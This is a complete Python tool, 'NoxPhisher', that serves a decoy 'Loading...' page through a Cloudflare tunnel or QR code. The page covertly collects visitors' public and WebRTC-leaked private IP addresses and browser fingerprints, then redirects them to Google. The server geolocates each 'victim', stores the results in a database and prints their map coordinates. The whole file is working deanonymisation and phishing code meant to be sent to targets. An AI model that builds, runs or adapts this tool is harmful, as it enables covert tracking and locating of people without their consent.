import os
import sys
import time
import json
import subprocess
import requests
import threading
import ipaddress
import argparse
import sqlite3
import datetime
import re
from http.server import HTTPServer, BaseHTTPRequestHandler

class IPGrabberUltimate:
    def __init__(self, port=8080, dedup_window=60):
        self.port = port
        self.dedup_window = dedup_window
        self.victims = []
        self.seen_ips = {}
        self.total_captures = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.db_path = "captures.db"
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id            INTEGER PRIMARY KEY AUTOINCREMENT,
                capture_id    INTEGER,
                ip_public     TEXT,
                ip_version    TEXT,
                ip_private    TEXT,
                ip_private_v6 TEXT,
                country       TEXT,
                region        TEXT,
                city          TEXT,
                lat           REAL,
                lon           REAL,
                isp           TEXT,
                org           TEXT,
                timezone      TEXT,
                asn           TEXT,
                user_agent    TEXT,
                browser       TEXT,
                language      TEXT,
                screen        TEXT,
                platform      TEXT,
                memory        TEXT,
                cores         TEXT,
                timestamp     INTEGER,
                datetime      TEXT
            )
        ''')
        conn.commit()
        conn.close()

    def save_to_db(self, data):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''
            INSERT INTO captures (
                capture_id, ip_public, ip_version, ip_private, ip_private_v6,
                country, region, city, lat, lon, isp, org, timezone, asn,
                user_agent, browser, language, screen, platform, memory, cores,
                timestamp, datetime
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data['capture_id'], data['ip_public'], data['ip_version'],
            data['ip_private'], data['ip_private_v6'],
            data['country'], data['region'], data['city'],
            data['lat'], data['lon'], data['isp'], data['org'],
            data['timezone'], data['as'],
            data['user_agent'], data['browser'], data['language'],
            data['screen'], data['platform'], data['memory'], data['cores'],
            data['timestamp'], data['datetime']
        ))
        conn.commit()
        conn.close()

    def get_captures(self, limit=50):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute('SELECT * FROM captures ORDER BY id DESC LIMIT ?', (limit,))
        rows = c.fetchall()
        conn.close()
        return rows

    def get_stats(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM captures')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(DISTINCT ip_public) FROM captures')
        unique = c.fetchone()[0]
        conn.close()
        return total, unique

    def is_duplicate(self, ip, fingerprint):
        with self.lock:
            now = time.time()
            key = f"{ip}_{fingerprint}"

            if key in self.seen_ips:
                timestamps = [t for t in self.seen_ips[key] if now - t < self.dedup_window]
                if timestamps:
                    self.seen_ips[key] = timestamps
                    return True
                else:
                    del self.seen_ips[key]

            self.seen_ips.setdefault(key, []).append(now)
            self.total_captures += 1
            return False

    def cleanup_seen(self):
        now = time.time()
        with self.lock:
            keys_to_delete = [
                key for key, timestamps in self.seen_ips.items()
                if not [t for t in timestamps if now - t < self.dedup_window]
            ]
            for key in keys_to_delete:
                del self.seen_ips[key]

    def get_public_ip(self):
        try:
            r = requests.get('https://api.ipify.org', timeout=5)
            return r.text.strip()
        except:
            try:
                r = requests.get('http://ip-api.com/json/', timeout=5)
                return r.json().get('query', '0.0.0.0')
            except:
                return "0.0.0.0"

    def get_ip_info(self, ip):
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,as",
                timeout=5
            )
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 'success':
                    return {
                        'country':  data.get('country', ''),
                        'region':   data.get('regionName', ''),
                        'city':     data.get('city', ''),
                        'lat':      data.get('lat', 0),
                        'lon':      data.get('lon', 0),
                        'isp':      data.get('isp', ''),
                        'org':      data.get('org', ''),
                        'timezone': data.get('timezone', ''),
                        'as':       data.get('as', '')
                    }
        except:
            pass
        return {}

    def detect_ip_version(self, ip):
        try:
            ipaddress.ip_address(ip)
            return 'IPv6' if ':' in ip else 'IPv4'
        except:
            return 'Unknown'

    def create_web(self):
        os.makedirs("grabber_web", exist_ok=True)

        html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #0a0a0a;
            color: #00ff88;
        }
        .loader {
            border: 4px solid #1a1a1a;
            border-top: 4px solid #00ff88;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0%   { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .container { text-align: center; }
        .status { font-family: monospace; font-size: 14px; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1 style="font-weight:300;">Cargando...</h1>
        <p class="status">Estableciendo conexión segura</p>
    </div>
    <script>
        async function sendData() {
            try {
                const data = {
                    ip_private:    await getLocalIP(),
                    ip_private_v6: await getLocalIPv6(),
                    user_agent:    navigator.userAgent,
                    language:      navigator.language,
                    screen:        screen.width + "x" + screen.height,
                    timezone:      Intl.DateTimeFormat().resolvedOptions().timeZone,
                    platform:      navigator.platform,
                    memory:        navigator.deviceMemory || "unknown",
                    cores:         navigator.hardwareConcurrency || "unknown"
                };

                await fetch("/grab", {
                    method:  "POST",
                    headers: { "Content-Type": "application/json" },
                    body:    JSON.stringify(data)
                });

                document.querySelector(".status").textContent = "Redirigiendo...";
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
            } catch(e) {}
        }

        function getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => {
                        pc.setLocalDescription(offer);
                        pc.onicecandidate = (e) => {
                            if (e.candidate) {
                                const m = e.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
                                if (m) { resolve(m[0]); pc.close(); }
                            }
                        };
                        setTimeout(() => { resolve("unknown"); pc.close(); }, 3000);
                    });
                } catch(e) { resolve("unknown"); }
            });
        }

        function getLocalIPv6() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => {
                        pc.setLocalDescription(offer);
                        pc.onicecandidate = (e) => {
                            if (e.candidate) {
                                const m = e.candidate.candidate.match(/([0-9a-f]{0,4}:){2,7}[0-9a-f]{0,4}/i);
                                if (m) { resolve(m[0]); pc.close(); }
                            }
                        };
                        setTimeout(() => { resolve("unknown"); pc.close(); }, 3000);
                    });
                } catch(e) { resolve("unknown"); }
            });
        }

        sendData();
    </script>
</body>
</html>'''

        with open(os.path.join("grabber_web", "index.html"), "w") as f:
            f.write(html)

class GrabberHandler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass

    def send_ok(self):
        """Envía respuesta 200 absorbiendo BrokenPipeError si el cliente ya cerró."""
        try:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        except (BrokenPipeError, ConnectionResetError):
            pass

    def send_error_safe(self, code):
        """Envía respuesta de error absorbiendo BrokenPipeError."""
        try:
            self.send_response(code)
            self.end_headers()
        except (BrokenPipeError, ConnectionResetError):
            pass

    def do_GET(self):
        if self.path in ('/', '/index.html'):
            try:
                with open(os.path.join("grabber_web", "index.html"), "r") as f:
                    html = f.read()
                try:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(html.encode())
                except (BrokenPipeError, ConnectionResetError):
                    pass
            except FileNotFoundError:
                self.send_error_safe(500)
        else:
            self.send_error_safe(404)

    def do_POST(self):
        if self.path == '/grab':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                data = json.loads(post_data)
            except Exception:
                data = {}

            cf_ip = self.headers.get('CF-Connecting-IP')
            if cf_ip:
                ip_public = cf_ip.strip()
            else:
                forwarded = self.headers.get('X-Forwarded-For')
                if forwarded:
                    ip_public = forwarded.split(',')[0].strip()
                else:
                    ip_public = self.client_address[0]

            ip_private    = data.get('ip_private', 'unknown')
            ip_private_v6 = data.get('ip_private_v6', 'unknown')
            ua            = self.headers.get('User-Agent', '')

            fingerprint = f"{ip_private}_{ip_private_v6}_{ua[:50]}_{data.get('language', '')}"

            if self.server.grabber.is_duplicate(ip_public, fingerprint):
                print(f"\n[~] {ip_public} ya capturada — ignorando ({self.server.grabber.dedup_window}s)")
                self.send_ok()
                return

            ip_version = self.server.grabber.detect_ip_version(ip_public)
            ip_info    = self.server.grabber.get_ip_info(ip_public)
            now        = int(time.time())
            dt         = datetime.datetime.fromtimestamp(now).strftime("%Y-%m-%d %H:%M:%S")

            victim_data = {
                'capture_id':    self.server.grabber.total_captures,
                'ip_public':     ip_public,
                'ip_version':    ip_version,
                'ip_private':    ip_private,
                'ip_private_v6': ip_private_v6,
                'country':       ip_info.get('country', ''),
                'region':        ip_info.get('region', ''),
                'city':          ip_info.get('city', ''),
                'lat':           ip_info.get('lat', 0),
                'lon':           ip_info.get('lon', 0),
                'isp':           ip_info.get('isp', ''),
                'org':           ip_info.get('org', ''),
                'timezone':      ip_info.get('timezone', ''),
                'as':            ip_info.get('as', ''),
                'user_agent':    ua,
                'timestamp':     now,
                'datetime':      dt,
                'language':      data.get('language', ''),
                'screen':        data.get('screen', ''),
                'platform':      data.get('platform', ''),
                'memory':        data.get('memory', ''),
                'cores':         data.get('cores', ''),
                'browser':       self.detect_browser(ua)
            }

            self.server.grabber.victims.append(victim_data)
            self.server.grabber.save_to_db(victim_data)

            try:
                subprocess.run([
                    'termux-notification',
                    '--title',    'CAPTURA',
                    '--content',  f"IP: {ip_public} — {ip_info.get('city', '?')}",
                    '--priority', 'high'
                ], capture_output=True, timeout=2)
            except Exception:
                pass

            # Output terminal
            sep = "=" * 70
            print(f"\n{sep}")
            print(f"[!] CAPTURA #{self.server.grabber.total_captures} [{dt}]")
            print(sep)
            print(f"  IP Pública:  {ip_public} ({ip_version})")
            print(f"  IP Privada:  {ip_private}")
            if ip_private_v6 and ip_private_v6 != 'unknown':
                print(f"  IP Priv v6:  {ip_private_v6}")
            print(f"  País:        {ip_info.get('country', '')}")
            print(f"  Región:      {ip_info.get('region', '')}")
            print(f"  Ciudad:      {ip_info.get('city', '')}")
            print(f"  ISP:         {ip_info.get('isp', '')}")
            print(f"  Organización:{ip_info.get('org', '')}")
            print(f"  AS:          {ip_info.get('as', '')}")
            if ip_info.get('lat') and ip_info.get('lon'):
                lat, lon = ip_info['lat'], ip_info['lon']
                print(f"  Coordenadas: {lat}, {lon}")
                print(f"  Google Maps: https://www.google.com/maps?q={lat},{lon}")
            print(f"  User-Agent:  {ua[:80]}...")
            print(f"  Navegador:   {victim_data['browser']}")
            print(f"  Idioma:      {data.get('language', '')}")
            print(f"  Pantalla:    {data.get('screen', '')}")
            print(f"  Plataforma:  {data.get('platform', '')}")
            print(f"  RAM:         {data.get('memory', '')}GB")
            print(f"  Núcleos:     {data.get('cores', '')}")
            print(sep)

            self.send_ok()
        else:
            self.send_error_safe(404)

    def detect_browser(self, ua):
        u = ua.lower()
        if 'edg' in u:      return 'Edge'
        if 'chrome' in u:   return 'Chrome'
        if 'firefox' in u:  return 'Firefox'
        if 'safari' in u:   return 'Safari'
        if 'opera' in u:    return 'Opera'
        return 'Unknown'

def parse_tunnel_url(line):
    m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
    return m.group(0) if m else None

def start_cloudflare_tunnel(port=8080):
    try:
        cmd  = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        url  = None
        for _ in range(30):
            line = proc.stdout.readline()
            if line:
                url = parse_tunnel_url(line)
                if url:
                    break
            time.sleep(0.5)
        if url:
            return url, proc
        proc.terminate()
        return None, None
    except Exception:
        return None, None

def generate_qr_terminal(url):
    print("\033[92m[*] Generando QR...\033[0m")
    try:
        result = subprocess.run(
            ['qrencode', '-t', 'ANSI', url],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout:
            print(result.stdout)
            return
    except Exception:
        pass

    try:
        import qrcode
        qr = qrcode.QRCode(version=1, box_size=2, border=1)
        qr.add_data(url)
        qr.make(fit=True)
        out = ""
        for row in qr.get_matrix():
            for cell in row:
                out += "██" if cell else "  "
            out += "\n"
        print("\033[92m" + out + "\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error QR: {e}\033[0m")

    print(f"\033[93m[+] URL: {url}\033[0m")

def view_captures(limit=50):
    grabber = IPGrabberUltimate()
    rows    = grabber.get_captures(limit)
    total, unique = grabber.get_stats()

    print("=" * 70)
    print("CAPTURAS GUARDADAS")
    print("=" * 70)
    print(f"Total: {total} | IPs únicas: {unique}")
    print("-" * 70)
    for row in rows:
        print(f"#{row['capture_id']} | {row['datetime']} | {row['ip_public']} ({row['ip_version']}) | {row['city']}, {row['country']} | {row['browser']}")
    print("=" * 70)

def shutdown(grabber, proc, server):
    total, unique = grabber.get_stats()
    elapsed = int(time.time() - grabber.start_time)
    hours   = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    print("\n" + "=" * 70)
    print("RESUMEN DE SESIÓN")
    print("=" * 70)
    print(f"  Duración:         {hours}h {minutes}m")
    print(f"  Capturas totales: {total}")
    print(f"  IPs únicas:       {unique}")
    print("=" * 70)
    print("\n[+] Cerrando...")
    if proc:
        proc.terminate()
    server.shutdown()
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="NoxPhisher — by nostraxiten")
    parser.add_argument('--qr',     action='store_true',        help='Generar QR del enlace')
    parser.add_argument('--window', type=int,   default=60,     help='Ventana de deduplicación en segundos')
    parser.add_argument('--port',   type=int,   default=8080,   help='Puerto del servidor')
    parser.add_argument('--view',   type=int,   nargs='?', const=50, help='Ver últimas N capturas')
    args = parser.parse_args()

    if args.view is not None:
        view_captures(args.view)
        return

    print("=" * 70)
    print("  NoxPhisher — IPv4 + IPv6 + QR + DEDUP + DB")
    print("  by nostraxiten | github.com/nostraxiten")
    print("=" * 70)

    grabber = IPGrabberUltimate(port=args.port, dedup_window=args.window)
    grabber.create_web()

    server = HTTPServer(('0.0.0.0', grabber.port), GrabberHandler)
    server.grabber = grabber

    t = threading.Thread(target=server.serve_forever)
    t.daemon = True
    t.start()

    public_ip = grabber.get_public_ip()
    print(f"[+] Servidor:      http://localhost:{grabber.port}")
    print(f"[+] IP del server: {public_ip}")
    print(f"[+] Dedup window:  {grabber.dedup_window}s")
    print(f"[+] Base de datos: {grabber.db_path}")
    print("[*] Creando túnel Cloudflare...")
    print("━━" * 35)

    url, proc = start_cloudflare_tunnel(grabber.port)

    if url:
        print(f"\n  [URL] {url}\n")
        print("━━" * 35)
        print("[+] Envía este enlace o escanea el QR")
        print("[+] Al entrar se captura IP REAL (IPv4/IPv6)")
        print("[+] Deduplicación activa")
        print("=" * 70)
        if args.qr:
            generate_qr_terminal(url)
    else:
        url = f"http://{public_ip}:{grabber.port}"
        print(f"[!] Tunnel fallido — usando IP directa: {url}")
        if args.qr:
            generate_qr_terminal(url)

    try:
        while True:
            grabber.cleanup_seen()
            time.sleep(60)
    except KeyboardInterrupt:
        shutdown(grabber, proc if url else None, server)


if __name__ == "__main__":
    main()
